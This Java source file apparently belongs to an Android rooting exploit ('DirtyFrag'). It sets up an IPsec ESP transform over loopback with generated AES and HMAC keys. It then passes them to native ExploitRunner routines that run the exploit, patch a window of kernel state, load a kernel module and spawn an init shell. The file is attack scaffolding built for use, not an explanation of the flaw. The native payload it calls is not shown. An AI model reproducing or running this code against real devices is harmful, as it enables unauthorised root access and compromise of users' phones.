package df.root;

import android.content.Context;
import android.net.IpSecAlgorithm;
import android.net.IpSecManager;
import android.net.IpSecTransform;

import java.net.DatagramSocket;
import java.net.InetAddress;
import java.security.SecureRandom;

final class DirtyFragSession implements AutoCloseable {
    final int encapPort;
    final int spi;
    final byte[] aesKey;
    final byte[] hmacKey;
    final int icvLength;
    final int senderPort;

    private final IpSecManager.UdpEncapsulationSocket encapSocket;
    private final IpSecManager.SecurityParameterIndex spiObject;
    private final IpSecTransform transform;

    private DirtyFragSession(int encapPort, int spi, byte[] aesKey, byte[] hmacKey,
                             int icvLength, int senderPort,
                             IpSecManager.UdpEncapsulationSocket encapSocket,
                             IpSecManager.SecurityParameterIndex spiObject,
                             IpSecTransform transform) {
        this.encapPort = encapPort;
        this.spi = spi;
        this.aesKey = aesKey;
        this.hmacKey = hmacKey;
        this.icvLength = icvLength;
        this.senderPort = senderPort;
        this.encapSocket = encapSocket;
        this.spiObject = spiObject;
        this.transform = transform;
    }

    static DirtyFragSession open(Context context, IReporter reporter) throws Exception {
        IpSecManager manager = (IpSecManager) context.getSystemService(Context.IPSEC_SERVICE);
        if (manager == null) throw new IllegalStateException("IpSecManager unavailable");

        IpSecManager.UdpEncapsulationSocket socket = null;
        IpSecManager.SecurityParameterIndex spiObject = null;
        IpSecTransform transform = null;
        try {
            socket = manager.openUdpEncapsulationSocket();
            int encapPort = socket.getPort();
            InetAddress loopback = InetAddress.getByName("127.0.0.1");
            spiObject = manager.allocateSecurityParameterIndex(loopback);
            int spi = spiObject.getSpi();

            SecureRandom random = new SecureRandom();
            byte[] aesKey = new byte[32];
            byte[] hmacKey = new byte[32];
            random.nextBytes(aesKey);
            random.nextBytes(hmacKey);
            int icvLength = 16;
            int senderPort;
            try (DatagramSocket sender = new DatagramSocket()) {
                senderPort = sender.getLocalPort();
            }
            transform = new IpSecTransform.Builder(context)
                    .setEncryption(new IpSecAlgorithm(IpSecAlgorithm.CRYPT_AES_CBC, aesKey))
                    .setAuthentication(new IpSecAlgorithm(
                            IpSecAlgorithm.AUTH_HMAC_SHA256, hmacKey, icvLength * 8))
                    .setIpv4Encapsulation(socket, senderPort)
                    .buildTransportModeTransform(loopback, spiObject);

            reporter.report("encap port: " + encapPort + "\n");
            reporter.report("spi: 0x" + Integer.toHexString(spi) + "\n");
            return new DirtyFragSession(encapPort, spi, aesKey, hmacKey,
                    icvLength, senderPort, socket, spiObject, transform);
        } catch (Exception error) {
            if (transform != null) transform.close();
            if (spiObject != null) spiObject.close();
            if (socket != null) socket.close();
            throw error;
        }
    }

    int runModule(IReporter reporter, String koTarget, boolean softReboot) {
        return ExploitRunner.nativeRunAll(reporter, koTarget, encapPort, spi,
                aesKey, hmacKey, icvLength, senderPort, softReboot);
    }

    int runPatchWindow(IReporter reporter, String statePath, int windowMs) {
        return ExploitRunner.nativeRunPatchWindow(reporter, statePath, windowMs,
                encapPort, spi, aesKey, hmacKey, icvLength, senderPort);
    }

    int runInitShell(IReporter reporter) {
        return ExploitRunner.nativeRunInitShell(reporter, encapPort, spi,
                aesKey, hmacKey, icvLength, senderPort);
    }

    @Override
    public void close() throws Exception {
        Exception failure = null;
        try {
            transform.close();
        } catch (Exception error) {
            failure = error;
        }
        try {
            spiObject.close();
        } catch (Exception error) {
            if (failure == null) failure = error;
            else failure.addSuppressed(error);
        }
        try {
            encapSocket.close();
        } catch (Exception error) {
            if (failure == null) failure = error;
            else failure.addSuppressed(error);
        }
        if (failure != null) throw failure;
    }
}
